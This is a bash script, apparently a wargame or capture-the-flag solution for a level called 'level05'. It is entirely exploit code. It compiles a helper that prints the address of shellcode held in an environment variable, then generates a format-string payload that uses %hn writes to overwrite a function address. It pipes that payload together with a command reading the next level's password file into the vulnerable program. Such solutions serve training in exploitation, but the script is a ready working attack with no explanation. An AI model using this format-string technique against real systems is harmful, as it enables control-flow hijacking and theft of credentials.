#! /bin/bash

echo '''
#include <stdio.h>
#include <stdlib.h>

int main ()
{
  printf("%p\n", getenv("SHELLCODE"));
  return 0;
}
''' > /tmp/addr.c;

gcc -m32 /tmp/addr.c -o /tmp/addr;

/tmp/addr | python -c '''
import struct

exit_1 = struct.pack("I", 0x080497e0)
exit_2 = struct.pack("I", 0x080497e0 + 2)
sc_adr = int(raw_input(''), 16)
t = [0xffff & sc_adr, (0xffff0000 & sc_adr) >> 16]
a1 = min(t)
a2 = max(t)

exp = exit_1 + exit_2

p = lambda x: "%%%sx" % x

ret = exp + p(a1 - len(exp)) + "%1" + str(t.index(a1)) + "$hn" + p(a2 - a1) + "%1" + str(t.index(a2)) + "$hn"

exit(1) if any([i > 64 and i < 91 for i in ret]) else 1

print ret
''' > /tmp/exploit_level05;

(cat /tmp/exploit_level05; echo "cat /home/users/level06/.pass";) | ./level05;
